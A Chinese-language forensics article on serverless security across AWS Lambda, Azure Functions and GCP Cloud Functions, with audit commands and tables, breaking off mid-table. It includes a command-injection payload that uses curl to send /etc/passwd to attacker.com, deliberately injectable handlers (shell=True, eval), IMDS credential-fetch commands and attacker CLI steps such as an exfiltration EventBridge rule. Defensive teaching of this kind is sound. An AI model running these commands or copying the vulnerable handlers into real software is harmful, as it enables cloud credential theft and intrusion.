---
title: "Serverless与云函数安全取证深度分析"
date: 2026-07-12T10:30:00+08:00
draft: false
weight: 750
description: "系统剖析Serverless与云函数架构的安全取证全流程，涵盖AWS Lambda攻击面与取证方法、Azure Functions安全分析与日志取证、Google Cloud Functions漏洞利用、环境变量注入与临时凭证滥用、事件源篡改与触发器安全、冷启动攻击与竞态条件、Serverless依赖投毒与包管理安全，结合真实云函数安全事件案例提供Sigma规则与自动化检测脚本"
categories: ["应急响应", "取证分析"]
tags: ["Serverless安全", "AWS Lambda", "Azure Functions", "云函数取证", "函数即服务", "临时凭证滥用", "环境变量注入", "事件源篡改", "MITRE ATT&CK", "云安全"]
---

# Serverless与云函数安全取证深度分析

Serverless（无服务器）计算是云计算架构的一次范式转移，开发者不再管理底层服务器、操作系统或运行时环境，而是将代码以Function as a Service（FaaS）的形式部署到云平台，由平台自动处理扩缩容、补丁更新和基础设施运维。AWS Lambda、Azure Functions、Google Cloud Functions三大主流平台已承载数百万企业的核心业务逻辑，从API后端、数据处理流水线到事件驱动的自动化工作流，Serverless架构无处不在。

然而，Serverless的"无服务器"并不意味着"无安全问题"。恰恰相反，Serverless引入了一套全新的攻击面：函数执行角色的IAM过度授权、环境变量中的敏感凭证泄露、事件源注入与触发器篡改、冷启动阶段的竞态条件利用、依赖包供应链投毒、临时文件系统的跨函数数据残留等，这些攻击向量在传统服务器安全模型中并不存在或不显著。更关键的是，Serverless环境的取证面临独特挑战——函数实例的短暂性（执行完毕即销毁）、日志分散在多个云服务中、无持久化文件系统可供磁盘取证、网络流量由平台代理而无法直接捕获。

2019年Capital One数据泄露事件中，攻击者利用AWS WAF中的SSRF漏洞获取Lambda函数的临时凭证，进而访问S3存储桶中的1.06亿条客户记录，这一事件深刻揭示了Serverless环境中攻击链的复杂性与取证的紧迫性。2022年以来，针对Serverless环境的加密货币挖矿、数据窃取、DDoS放大等攻击案例持续增长，云函数已成为攻击者滥用云计算资源的重要载体。

本文从蓝队取证实战视角出发，系统性地覆盖Serverless安全取证的全链路分析——从FaaS架构模型与事件驱动执行机制到AWS Lambda/Azure Functions/GCP Cloud Functions三大平台的攻击面与取证方法，从环境变量注入与临时凭证滥用到事件源篡改与触发器安全，从冷启动攻击与竞态条件利用到依赖投毒与供应链安全，结合Capital One数据泄露、AWS Lambda Cryptocurrency Mining等真实案例还原云函数攻击的完整取证流程，提供Sigma规则与Bash/Python自动化检测脚本。

---

## 0x01 技术基础与Serverless架构概述

### FaaS架构模型

FaaS（Function as a Service）是Serverless计算的核心实现形式，其架构模型围绕"事件驱动的函数执行"构建。当触发事件到达时，云平台自动分配计算资源、加载函数代码、执行逻辑并返回结果，整个过程中开发者无需干预底层基础设施。

| 架构层 | AWS Lambda | Azure Functions | Google Cloud Functions |
|--------|-----------|----------------|----------------------|
| 运行时 | Node.js/Python/Java/Go/Ruby/C#/.NET/自定义 | .NET/Node.js/Python/Java/PowerShell/自定义 | Node.js/Python/Go/Java/Ruby/.NET/PHP |
| 触发源 | API Gateway/S3/SQS/SNS/DynamoDB/CloudWatch/EventBridge | HTTP Trigger/Timer/Blob/Queue/Event Hub/Cosmos DB | HTTP/Cloud Storage/Pub/Sub/Firestore/Schedule |
| 执行环境 | Firecracker microVM | 容器（Docker/Kubernetes） | 容器（gVisor沙箱） |
| 冷启动 | 100ms-数秒（取决于包大小和运行时） | 通常50-200ms（预热后） | 100ms-数秒 |
| 最大执行时间 | 900秒（15分钟） | 无硬性限制（消耗计划） | 540秒（9分钟） |
| 最大内存 | 10,240 MB | 14,336 MB | 32,768 MB |
| 资源隔离 | microVM级别 | 容器级别 | gVisor沙箱级别 |

### 事件驱动执行模型

Serverless函数的执行完全由事件驱动，事件源（Event Source）的多样性决定了攻击面的广泛性。以AWS Lambda为例，其事件源可分为以下类别：

| 事件源类别 | 典型服务 | 安全风险 | MITRE ATT&CK |
|-----------|---------|---------|-------------|
| HTTP请求 | API Gateway、Function URL | 未授权访问、参数注入 | T1190 Exploit Public-Facing Application |
| 存储事件 | S3 Put/Post、DynamoDB Stream | 事件源篡改、恶意文件触发 | T1565 Data Manipulation |
| 消息队列 | SQS、SNS、Kinesis | 消息注入、权限提升 | T1565.003 Transmitted Data Manipulation |
| 定时任务 | EventBridge Scheduler、CloudWatch Events | 定时持久化、资源滥用 | T1053 Scheduled Task/Job |
| 认证事件 | Cognito、IAM Identity Center | 认证绕过、Token伪造 | T1078 Valid Accounts |
| 监控事件 | CloudWatch Logs、CloudTrail | 日志篡改、告警抑制 | T1562.002 Disable Windows Event Logging |

### 与传统服务器取证差异

Serverless取证与传统服务器取证在多个维度上存在本质差异，这些差异决定了取证策略和工具选择的根本不同：

| 取证维度 | 传统服务器 | Serverless函数 | 取证影响 |
|---------|-----------|---------------|---------|
| 文件系统 | 持久化磁盘，可离线取证 | 临时文件系统（/tmp），实例销毁即消失 | 无法进行磁盘镜像取证 |
| 进程 | 持续运行的进程，可实时检查 | 短暂执行，无持久化进程 | 无法attach调试器 |
| 网络 | 可镜像流量、部署IDS | 流量由平台代理，无法直接捕获 | 必须依赖平台日志 |
| 内存 | 可通过/proc或工具dump | 函数退出后内存释放 | 仅能获取运行时内存快照 |
| 日志 | syslog、应用日志集中存储 | CloudWatch/Azure Monitor/Cloud Logging分散存储 | 需跨服务关联分析 |
| 权限模型 | 用户级别、sudo | IAM角色、执行角色、资源策略 | 需分析IAM策略链 |
| 持久化 | 计划任务、服务、注册表 | Layer包、环境变量、EventBridge规则 | 需检查多处持久化向量 |

### 取证挑战总结

Serverless环境取证面临六大核心挑战：

**实例短暂性**：Lambda函数实例执行完毕后立即销毁，取证窗口极短。攻击者可在单次调用中完成恶意行为，传统的磁盘取证和内存取证方法完全失效。

**日志碎片化**：取证证据分散在CloudWatch Logs、CloudTrail、VPC Flow Logs、API Gateway日志、S3访问日志等多个独立服务中，需要跨服务关联分析才能还原完整攻击链。

**权限分析复杂**：函数执行角色、资源策略、Lambda Permission、API Gateway授权器等多层权限嵌套，使得权限边界模糊，攻击者可利用策略配置缺陷进行权限提升。

**无持久化存储**：函数的根文件系统为只读（除/tmp外），攻击者无法安装持久化后门，但可利用Layer、环境变量、EventBridge规则实现逻辑持久化。

**供应链风险**：函数依赖的npm/PyPI包、Lambda Layer、容器基础镜像等供应链环节均可被投毒，而Serverless环境通常缺乏传统的依赖审计流程。

**多租户隔离**：云平台底层的多租户隔离机制（microVM、容器、gVisor）的漏洞可能导致跨租户数据泄露，但这类漏洞的取证极为困难。

---

## 0x02 AWS Lambda攻击面与取证方法

### Lambda函数代码注入

AWS Lambda函数代码注入是最直接的攻击向量。攻击者通过多种途径将恶意代码注入到Lambda函数的执行流程中：

**通过API Gateway注入**：当Lambda函数作为API Gateway的后端集成时，API请求中的参数直接传递给Lambda处理函数。如果函数未对输入进行充分验证，攻击者可通过构造特殊请求触发命令注入、代码注入或路径遍历。

```python
import os
import subprocess

def lambda_handler(event, context):
    filename = event['queryStringParameters']['file']
    cmd = f"ls -la /tmp/{filename}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return {"statusCode": 200, "body": result.stdout}
```

上述代码中，攻击者可通过`file`参数注入操作系统命令，例如`file=test;curl+http://attacker.com/exfil?data=$(cat/etc/passwd)`。

**通过环境变量注入**：如果Lambda函数从环境变量读取配置并用于构建命令或SQL查询，攻击者通过修改环境变量即可实现代码注入。环境变量可通过Lambda控制台、AWS CLI或CloudFormation模板进行修改，修改操作会被CloudTrail记录。

```bash
aws lambda update-function-configuration \
    --function-name target-function \
    --environment "Variables={DB_HOST=attacker-controlled-host,API_KEY=stolen-key}"
```

**通过Lambda Layer注入**：Lambda Layer允许将共享代码库、运行时扩展或自定义二进制文件附加到函数。攻击者可通过创建包含恶意代码的Layer并将其附加到目标函数，实现持久化代码注入。

### Layer攻击

Lambda Layer是AWS Lambda的代码共享机制，允许将公共依赖、自定义运行时或工具库打包为Layer并附加到多个函数。攻击者利用Layer进行攻击的典型方式包括：

| 攻击方式 | 描述 | MITRE ATT&CK | 取证线索 |
|---------|------|-------------|---------|
| 恶意Layer替换 | 替换函数使用的公共Layer版本 | T1554 Compromise Client Software Binary | Layer ARN变更CloudTrail记录 |
| Layer代码注入 | 在合法Layer中注入恶意代码段 | T1059 Command and Scripting Interpreter | 函数执行时加载的额外依赖 |
| 共享Layer投毒 | 污染组织内部共享的Layer仓库 | T1195 Supply Chain Compromise | Layer版本历史和发布者审计 |
| Layer权限提升 | Layer中包含提升执行角色权限的代码 | T1078 Valid Accounts | IAM策略变更记录 |

```bash
aws lambda get-layer-versions --layer-name target-layer
aws lambda get-layer-version-by-arn --layer-arn "arn:aws:lambda:region:account:layer:name:version"
```

### API Gateway暴露

API Gateway是Serverless架构中最常见的HTTP入口，其安全配置直接影响Lambda函数的暴露面：

| API Gateway问题 | 安全风险 | 取证方法 |
|----------------|---------|---------|
| 未配置授权器（Authorizer） | 未授权API访问 | API Gateway执行日志中的4xx/5xx响应 |
| 使用API Key作为唯一认证 | API Key泄露导致未授权访问 | CloudTrail中的API Key创建和使用记录 |
| CORS配置过于宽松 | 跨域请求滥用 | OPTIONS请求日志分析 |
| 未启用请求验证 | 参数注入和模糊测试 | Lambda函数异常执行日志 |
| 自定义域名未配置HTTPS | 中间人攻击 | 证书配置审计 |

```bash
aws apigateway get-rest-apis --query 'items[*].{id:id,name:name,endpointConfiguration:endpointConfiguration}'
aws apigateway get-resources --rest-api-id <API_ID> --query 'items[*].{path:path,resourceMethods:resourceMethods}'
aws apigateway get-authorizers --rest-api-id <API_ID>
```

### CloudTrail日志分析

CloudTrail是AWS Lambda安全取证的核心数据源，记录了所有Lambda相关的API调用：

```bash
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=InvokeFunction \
    --start-time $(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%SZ) \
    --query 'Events[*].{Time:EventTime,Function:CloudTrailEvent,User:Username}'

aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionCode \
    --query 'Events[*].{Time:EventTime,Detail:CloudTrailEvent}'

aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionConfiguration \
    --query 'Events[*].{Time:EventTime,Detail:CloudTrailEvent}'
```

| CloudTrail事件 | 取证意义 | 响应优先级 |
|---------------|---------|-----------|
| UpdateFunctionCode | 函数代码被修改，可能为恶意注入 | 高 |
| UpdateFunctionConfiguration | 配置（含环境变量）被修改 | 高 |
| AddPermission / RemovePermission | Lambda资源策略变更 | 高 |
| CreateFunction | 新函数创建，可能为恶意部署 | 中 |
| InvokeFunction | 函数被调用，需结合参数分析 | 中 |
| DeleteFunction | 函数删除，可能为攻击者清理痕迹 | 中 |
| PublishLayerVersion | Layer版本发布 | 中 |
| UpdateEventSourceMapping | 事件源映射修改 | 中 |

### VPC配置安全

当Lambda函数配置在VPC中时，其网络访问受安全组和子网配置控制。攻击者可能利用VPC配置缺陷进行内网横向移动：

```bash
aws lambda get-function-configuration --function-name target-function \
    --query '{VpcConfig:VpcConfig,Role:Role,Timeout:Timeout,MemorySize:MemorySize}'
```

| VPC配置问题 | 安全风险 | 取证线索 |
|------------|---------|---------|
| 函数位于公有子网 | 函数可直接访问互联网 | VPC Flow Logs中的出站连接 |
| 安全组规则过于宽松 | 函数可访问内部服务 | 安全组变更CloudTrail记录 |
| 无VPC配置 | 函数可访问互联网和AWS服务 | Lambda默认网络配置 |
| ENI残留 | 旧网络接口未清理 | EC2 ENI列表审计 |

### Lambda函数URL安全

Lambda Function URL是2022年引入的功能，允许为Lambda函数创建公开的HTTPS端点。这一功能扩大了Lambda的暴露面：

```bash
aws lambda get-function-url-config --function-name target-function
```

| Function URL问题 | 安全风险 | 检测方法 |
|-----------------|---------|---------|
| AuthType设置为NONE | 任何人都可以调用函数 | Function URL配置审计 |
| 无速率限制 | DDoS和滥用风险 | CloudWatch Metrics调用量分析 |
| CORS配置错误 | 跨域数据泄露 | Function URL响应头分析 |

---

## 0x03 Azure Functions与GCP Cloud Functions安全分析

### Azure Functions安全模型

Azure Functions构建在Azure App Service平台之上，其安全模型涉及多个层次的权限和配置：

| 安全层级 | 配置项 | 安全风险 | 取证方法 |
|---------|-------|---------|---------|
| 身份认证 | Authentication/Authorization设置 | 未授权访问 | App Service认证日志 |
| 托管身份 | System/User Assigned Managed Identity | 过度授权的托管身份 | Azure AD审计日志 |
| 网络隔离 | VNet Integration、Private Endpoints | 内网暴露 | NSG Flow Logs |
| 应用设置 | App Settings（含连接字符串） | 敏感信息明文存储 | App Settings变更日志 |
| 触发器安全 | HTTP/Timer/Blob/Queue触发器配置 | 触发器滥用 | 函数执行日志 |
| 运行时版本 | 函数运行时版本和.NET/Node版本 | 已知漏洞利用 | 运行时配置审计 |

```bash
az functionapp function list --resource-group <RG> --app-name <APP>
az functionapp config appsettings list --name <APP> --resource-group <RG>
az functionapp identity show --name <APP> --resource-group <RG>
```

Azure Functions的托管身份（Managed Identity）是关键取证点。攻击者一旦获取对函数的控制权，可通过托管身份获取Azure资源的访问权限：

```bash
az functionapp identity show --name <APP> --resource-group <RG> --query 'principalId'
az role assignment list --assignee <PRINCIPAL_ID> --query 'items[*].{Role:roleDefinitionName,Scope:scope}'
```

### GCP Cloud Functions触发器安全

Google Cloud Functions的触发器安全需要特别关注HTTP触发器的认证配置和Event触发器的权限设置：

| 触发器类型 | 安全风险 | MITRE ATT&CK | 取证方法 |
|-----------|---------|-------------|---------|
| HTTP Trigger（无认证） | 未授权函数调用 | T1190 Exploit Public-Facing Application | Cloud Audit Logs |
| Pub/Sub Trigger | 消息注入攻击 | T1565.003 Transmitted Data Manipulation | Pub/Sub审计日志 |
| Cloud Storage Trigger | 恶意文件触发执行 | T1565.001 Stored Data Manipulation | GCS访问日志 |
| Firestore Trigger | 数据篡改触发 | T1565.001 Stored Data Manipulation | Firestore审计日志 |
| Schedule Trigger | 定时持久化 | T1053 Scheduled Task/Job | Cloud Scheduler日志 |
| Firebase Auth Trigger | 用户创建事件滥用 | T1136 Account Creation | Firebase审计日志 |

```bash
gcloud functions describe <FUNCTION_NAME> --region <REGION>
gcloud functions get-iam-policy <FUNCTION_NAME> --region <REGION>
gcloud logging read "resource.type=cloud_function AND resource.labels.function_name=<FUNCTION>" --limit 100
```

### Durable Functions安全

Azure Durable Functions和AWS Step Functions等编排型Serverless服务引入了额外的安全面。编排函数管理着复杂的工作流状态，攻击者可通过篡改编排逻辑实现业务流程绕过：

| 攻击向量 | 描述 | MITRE ATT&CK | 取证线索 |
|---------|------|-------------|---------|
| 编排状态篡改 | 修改Durable Task历史记录 | T1565 Data Manipulation | Table Storage中的任务历史 |
| Activity函数劫持 | 将Activity函数重定向到恶意实现 | T1565.003 Transmitted Data Manipulation | 函数绑定配置变更 |
| 事件中心注入 | 向Event Hub注入伪造事件 | T1565.003 Transmitted Data Manipulation | Event Hub日志 |
| Sub-Orchestration绕过 | 绕过子编排的权限检查 | T1078 Valid Accounts | 编排日志 |

### Event Grid安全

Azure Event Grid是Serverless事件路由服务，连接事件源和事件处理函数。攻击者可能通过Event Grid进行事件注入和路由篡改：

```bash
az eventgrid event-subscription list --source-resource-id <TOPIC_ID>
az eventgrid domain list --resource-group <RG>
az eventgrid topic show --name <TOPIC> --resource-group <RG>
```

| Event Grid安全问题 | 风险等级 | 影响范围 | 检测方法 |
|-------------------|---------|---------|---------|
| 事件订阅无输入验证 | 高 | 下游函数处理恶意数据 | Event Grid访问日志 |
| 主题级别无访问控制 | 高 | 任意事件发布 | 主题授权规则审计 |
| 死信配置缺失 | 中 | 事件丢失和重放攻击 | 死信队列监控 |
| Webhook验证跳过 | 高 | 伪造事件注入 | HTTP触发器日志 |

---

## 0x04 环境变量注入与临时凭证滥用

### Lambda执行角色过度授权

Lambda执行角色（Execution Role）决定了函数可以访问哪些AWS资源。过度授权的执行角色是Serverless环境中最常见的安全隐患，也是攻击者在获取函数控制权后进行横向移动的关键跳板。

| 过度授权模式 | 风险描述 | MITRE ATT&CK | 取证方法 |
|-------------|---------|-------------|---------|
| 托管策略AdministratorAccess | 完全控制AWS账户 | T1078 Valid Accounts | IAM策略审计 |
| 自定义策略wildcard资源 | 访问所有资源 | T1078.004 Cloud Accounts | IAM模拟器分析 |
| 多函数共享同一角色 | 权限爆炸半径扩大 | T1078 Valid Accounts | IAM角色使用审计 |
| 角色信任策略过宽 | 可被其他服务承担 | T1098 Account Manipulation | 信任策略审计 |

```bash
aws iam simulate-principal-policy \
    --policy-source-arn "arn:aws:lambda:region:account:function:target-function" \
    --action-names s3:GetObject s3:PutObject iam:CreateUser sts:AssumeRole

aws iam get-role --role-name <ROLE_NAME> --query 'Role.{AssumeRolePolicyDocument:AssumeRolePolicyDocument,MaxSessionDuration:MaxSessionDuration}'
aws iam list-attached-role-policies --role-name <ROLE_NAME>
aws iam list-role-policies --role-name <ROLE_NAME>
```

### IMDS v1/v2安全

实例元数据服务（Instance Metadata Service）是Lambda函数获取临时凭证的底层机制。IMDS v1使用简单的HTTP GET请求获取凭证，容易被SSRF攻击利用；IMDS v2引入了基于Token的会话认证机制，显著提升了安全性。

| IMDS版本 | 认证机制 | 安全风险 | 取证方法 |
|---------|---------|---------|---------|
| IMDS v1 | HTTP GET无认证 | SSRF可直接获取凭证 | VPC Flow Logs中的169.254.169.254访问 |
| IMDS v2 | PUT Token + GET with Token | 需SSRF + 两步获取 | Token获取日志 |
| Lambda内置 | 内部凭证缓存 | 环境变量泄露可绕过 | Lambda运行时日志 |

```bash
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl -H "X-aws-ec2-metadata-token: <TOKEN>" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
```

### AWS STS凭证泄露

Lambda函数运行时使用AWS STS（Security Token Service）获取临时凭证，这些凭证包括Access Key、Secret Key和Session Token。如果函数代码或日志中泄露了这些凭证，攻击者可利用它们进行横向移动。

```python
import boto3
import logging

logger = logging.getLogger()
logger.setLevel(logging.INFO)

def lambda_handler(event, context):
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    logger.info(f"Account: {identity['Account']}, Arn: {identity['Arn']}")
    creds = sts.get_session_token(DurationSeconds=3600)
    logger.info(f"AccessKey: {creds['Credentials']['AccessKeyId']}")
    logger.info(f"SecretKey: {creds['Credentials']['SecretAccessKey']}")
    return {"statusCode": 200}
```

上述代码将临时凭证记录到CloudWatch Logs中，攻击者无需利用SSRF即可通过日志获取凭证。

| STS凭证泄露途径 | 取证方法 | 危险等级 |
|----------------|---------|---------|
| CloudWatch Logs明文记录 | 日志内容搜索 | 严重 |
| Lambda函数返回值 | API响应分析 | 严重 |
| /tmp目录文件存储 | Lambda临时文件残留 | 高 |
| 环境变量明文存储 | Lambda配置审计 | 高 |
| X-Ray跟踪数据 | X-Ray Trace分析 | 中 |

### 环境变量注入攻击链

环境变量是Serverless函数传递配置信息的主要方式，也是攻击者窃取和篡改的重点目标。完整的环境变量攻击链如下：

```bash
aws lambda get-function-configuration --function-name target-function \
    --query 'Environment.Variables'

aws lambda update-function-configuration --function-name target-function \
    --environment "Variables={MALICIOUS_VAR=exfiltrated_data}"
```

| 攻击阶段 | 操作 | 取证证据 | MITRE ATT&CK |
|---------|------|---------|-------------|
| 凭证发现 | 读取函数环境变量 | Lambda配置访问日志 | T1552 Credentials in Files |
| 数据外传 | 将敏感数据写入环境变量 | 环境变量变更CloudTrail记录 | T1074 Data Staged |
| 持久化 | 在环境变量中存储C2配置 | 环境变量内容异常 | T1071 Application Layer Protocol |
| 权限提升 | 修改执行角色信任策略 | IAM策略变更记录 | T1098 Account Manipulation |

### Lambda Extension安全

Lambda Extensions允许在函数执行生命周期中注入额外的代码，包括自定义运行时扩展和外部工具。攻击者可利用Extension机制在不修改函数代码的情况下注入恶意逻辑：

```bash
aws lambda get-function-configuration --function-name target-function \
    --query 'Layers[*].{Arn:Arn,CodeSize:CodeSize}'

aws lambda list-layer-versions --layer-name <LAYER_NAME> \
    --query 'LayerVersions[*].{Version:Version,CompatibleRuntimes:CompatibleRuntimes}'
```

| Extension安全风险 | 描述 | 检测方法 |
|-----------------|------|---------|
| 恶意Layer附加 | 在函数中附加包含恶意代码的Layer | Layer ARN变更审计 |
| Layer版本降级 | 降级到包含已知漏洞的旧版本 | Layer版本历史对比 |
| 内部Layer泄露 | 组织内部Layer被外部访问 | Layer跨账户共享审计 |
| Layer代码混淆 | Layer中的恶意代码通过混淆规避检测 | Layer代码静态分析 |

---

## 0x05 事件源篡改与触发器安全分析

### S3事件通知篡改

S3事件通知（Event Notification）是AWS Lambda最常用的触发器之一。攻击者可通过篡改S3事件配置或构造恶意S3事件来触发Lambda函数执行：

| S3事件篡改方式 | 描述 | MITRE ATT&CK | 取证方法 |
|--------------|------|-------------|---------|
| 恶意文件上传 | 上传含恶意载荷的文件触发处理函数 | T1565.001 Stored Data Manipulation | S3访问日志 |
| 事件通知重定向 | 修改事件通知规则将事件路由到恶意函数 | T1565.003 Transmitted Data Manipulation | S3事件通知配置变更 |
| 事件数据篡改 | 构造伪造的S3事件记录触发函数 | T1565.003 Transmitted Data Manipulation | CloudTrail事件验证 |
| Bucket Policy修改 | 修改存储桶策略允许未授权访问 | T1078 Valid Accounts | S3 bucket policy审计 |

```bash
aws s3api get-bucket-notification-configuration --bucket <BUCKET_NAME>
aws s3api put-bucket-notification-configuration --bucket <BUCKET_NAME> --notification-configuration file://config.json

cat <<'EOF' > /tmp/suspicious-notification.json
{
  "LambdaFunctionConfigurations": [
    {
      "LambdaFunctionArn": "arn:aws:lambda:region:account:function:attacker-function",
      "Events": ["s3:ObjectCreated:*"],
      "Filter": {
        "Key": {
          "FilterRules": [{"Name": "prefix", "FilterValue": "uploads/"}]
        }
      }
    }
  ]
}
EOF
```

### SQS/SNS事件注入

SQS（Simple Queue Service）和SNS（Simple Notification Service）是Serverless架构中常用的消息服务。攻击者可通过消息注入将恶意数据传递给下游Lambda函数：

```python
import boto3
import json

def lambda_handler(event, context):
    for record in event['Records']:
        message = json.loads(record['body'])
        user_input = message.get('user_data', '')
        result = eval(user_input)
        return {"statusCode": 200, "body": str(result)}
```

上述代码中，如果Lambda函数从SQS消息中读取用户输入并直接执行，攻击者可通过向SQS队列发送恶意消息实现远程代码执行。

| 消息注入攻击向量 | 描述 | 取证线索 | 防御措施 |
|----------------|------|---------|---------|
| SQS消息直接注入 | 发送包含恶意payload的消息 | SQS消息审计日志 | 消息内容验证 |
| SNS主题订阅劫持 | 向目标主题发布恶意消息 | SNS发布日志 | 主题访问策略 |
| SQS队列策略篡改 | 修改队列策略允许外部写入 | 队列策略变更记录 | 队列策略最小化 |
| 消息重放攻击 | 重放历史消息触发重复处理 | 消息ID和时间戳分析 | 幂等性设计 |

### EventBridge规则滥用

Amazon EventBridge是Serverless架构中的事件总线，攻击者可通过创建恶意规则实现持久化、数据外传和横向移动：

```bash
aws events put-rule --name "exfiltration-rule" \
    --event-pattern '{"source":["aws.s3"],"detail-type":["Object Created"]}' \
    --state ENABLED

aws events put-targets --rule "exfiltration-rule" \
    --targets '[{"Id":"exfil","Arn":"arn:aws:lambda:region:account:function:exfil-function"}]'
```

| EventBridge滥用场景 | 描述 | MITRE ATT&CK | 取证方法 |
|-------------------|------|-------------|---------|
| 恶意规则创建 | 创建规则将事件路由到攻击者控制的函数 | T1053 Scheduled Task/Job | EventBridge规则审计 |
| 规则目标替换 | 将现有规则的目标替换为恶意函数 | T1565.003 Transmitted Data Manipulation | 规则目标变更记录 |
| 跨账户事件注入 | 向其他账户的EventBridge发送伪造事件 | T1078 Valid Accounts | 跨账户事件日志 |
| 事件过滤绕过 | 构造绕过事件过滤条件的恶意事件 | T1565.003 Transmitted Data Manipulation | 事件模式分析 |

### API Gateway参数污染

API Gateway在将请求转发给Lambda函数时，可能对请求参数进行处理和转换。攻击者可通过参数污染（HTTP Parameter Pollution）绕过安全检查：

| 参数污染技术 | 描述 | 影响 | 检测方法 |
|-------------|------|------|---------|
| 同名参数注入 | 发送多个同名查询参数 | Lambda收到的参数值可能与预期不同 | API Gateway日志 |
| JSON参数覆盖 | 在JSON请求体中使用重复键 | 后端处理使用第一个或最后一个值 | 请求体日志分析 |
| 路径参数污染 | 在URL路径中注入特殊字符 | 路径遍历和命令注入 | 访问日志分析 |
| Content-Type混淆 | 使用不同Content-Type发送请求 | 解析器行为差异导致注入 | 请求头日志分析 |

### Webhook验证绕过

许多Serverless函数作为Webhook接收端，处理来自第三方服务（GitHub、Stripe、Slack等）的回调。如果Webhook验证不严格，攻击者可伪造Webhook请求触发恶意操作：

```python
import hmac
import hashlib

def verify_github_webhook(payload, signature, secret):
    expected = 'sha256=' + hmac.new(
        secret.encode(), payload.encode(), hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(expected, signature)

def lambda_handler(event, context):
    signature = event['headers'].get('X-Hub-Signature-256', '')
    if not verify_github_webhook(event['body'], signature, WEBHOOK_SECRET):
        return {"statusCode": 403, "body": "Invalid signature"}
    process_webhook(event['body'])
    return {"statusCode": 200, "body": "OK"}
```

---

## 0x06 冷启动攻击与竞态条件利用

### 冷启动信息泄露

Lambda冷启动（Cold Start）是函数实例首次创建或长时间未调用后重新创建的过程。冷启动阶段存在信息泄露和竞态条件的安全风险：

| 冷启动安全风险 | 描述 | MITRE ATT&CK | 影响 |
|--------------|------|-------------|------|
| 初始化阶段日志泄露 | 冷启动过程中记录敏感信息 | T1552 Credentials in Files | 凭证泄露到CloudWatch |
| 运行时版本信息泄露 | 冷启动错误消息暴露运行时版本 | T1592 Gather Victim Host Information | 精确漏洞定位 |
| 依赖加载顺序暴露 | 模块导入顺序泄露架构信息 | T1592 Gather Victim Host Information | 攻击面分析 |
| 环境变量初始化延迟 | 环境变量未就绪时函数执行 | T1499 Endpoint Denial of Service | 逻辑漏洞利用 |
| VPC连接超时 | VPC冷启动可能导致超时 | T1499 Endpoint Denial of Service | DoS条件利用 |

```python
import os
import time

SLOW_INITIALIZATION_VAR = None

def init():
    global SLOW_INITIALIZATION_VAR
    time.sleep(2)
    SLOW_INITIALIZATION_VAR = os.environ.get('SENSITIVE_CONFIG', 'default')

init()

def lambda_handler(event, context):
    return {"config": SLOW_INITIALIZATION_VAR}
```

上述代码中，初始化函数`init()`在冷启动阶段执行，如果在执行完成前函数被调用，可能导致`SLOW_INITIALIZATION_VAR`为`None`，从而绕过依赖配置的安全检查。

### 初始化阶段竞态条件

Lambda函数的冷启动初始化阶段与请求处理阶段之间存在时间窗口，攻击者可利用这一时间窗口进行竞态条件攻击：

```python
import os
import json
import boto3

config_cache = None

def init():
    global config_cache
    s3 = boto3.client('s3')
    response = s3.get_object(Bucket='config-bucket', Key='app-config.json')
    config_cache = json.loads(response['Body'].read())

init()

def lambda_handler(event, context):
    if config_cache is None:
        return {"statusCode": 500, "body": "Config not loaded"}
    return {"statusCode": 200, "body": json.dumps(config_cache)}
```

### 共享临时文件系统安全

Lambda函数的/tmp目录是函数实例中唯一的可写存储区域。在同一函数的不同调用之间，如果实例被复用（Warm Start），/tmp目录中的文件会持续存在。攻击者可利用这一特性进行跨调用数据泄露：

| /tmp目录攻击场景 | 描述 | MITRE ATT&CK | 取证方法 |
|-----------------|------|-------------|---------|
| 凭证文件残留 | 将凭据写入/tmp后被后续调用读取 | T1552 Credentials in Files | /tmp目录文件分析 |
| 日志篡改 | 覆盖或删除/tmp中的日志文件 | T1070 Indicator Removal | Lambda执行日志 |
| 恶意脚本缓存 | 将恶意脚本写入/tmp后执行 | T1059 Command and Scripting Interpreter | 文件哈希分析 |
| 临时密钥存储 | 在/tmp中存储窃取的临时凭证 | T1552 Credentials in Files | 文件时间戳分析 |

```bash
aws lambda get-function-configuration --function-name target-function \
    --query '{FileSystemConfigs:FileSystemConfigs,EphemeralStorage:EphemeralStorage}'
```

### /tmp目录攻击

Lambda函数默认提供512MB的/tmp存储空间（可通过EphemeralStorage配置扩展到10GB）。攻击者可利用/tmp目录进行以下攻击：

```python
import os
import tempfile
import subprocess

def lambda_handler(event, context):
    payload = event.get('payload', '')
    script_path = os.path.join(tempfile.gettempdir(), 'worker.sh')
    with open(script_path, 'w') as f:
        f.write(f'#!/bin/bash\n{payload}\n')
    os.chmod(script_path, 0o755)
    result = subprocess.run(['bash', script_path], capture_output=True, text=True)
    os.remove(script_path)
    return {"stdout": result.stdout, "stderr": result.stderr}
```

### ENI安全

Lambda函数在VPC模式下会创建弹性网络接口（Elastic Network Interface, ENI）。ENI的配置和管理涉及多项安全考量：

| ENI安全问题 | 风险描述 | 取证方法 |
|------------|---------|---------|
| ENI残留 | 函数删除后ENI未被清理 | EC2 ENI列表审计 |
| ENI跨子网共享 | 不同安全级别的函数共享ENI | ENI关联实例分析 |
| ENI DNS配置异常 | DNS解析被重定向 | VPC DNS配置审计 |
| ENI安全组过宽 | 安全组规则允许不必要的流量 | 安全组规则审计 |

```bash
aws ec2 describe-network-interfaces \
    --filters "Name=description,Values='AWS Lambda VPC ENI*'" \
    --query 'NetworkInterfaces[*].{Id:NetworkInterfaceId,SubnetId:SubnetId,SecurityGroups:Groups,Status:Status}'
```

---

## 0x07 Serverless依赖投毒与包管理安全

### npm/PyPI依赖投毒

Serverless函数大量依赖第三方npm/PyPI包，这为供应链攻击提供了可乘之机。攻击者通过投毒流行依赖包、typosquatting（拼写仿冒）或dependency confusion（依赖混淆）等手段，在Serverless环境中实现代码执行：

| 依赖投毒类型 | 描述 | MITRE ATT&CK | 影响范围 |
|-------------|------|-------------|---------|
| 直接投毒 | 要挟或入侵包维护者账户上传恶意版本 | T1195 Supply Chain Compromise | 所有使用该版本的函数 |
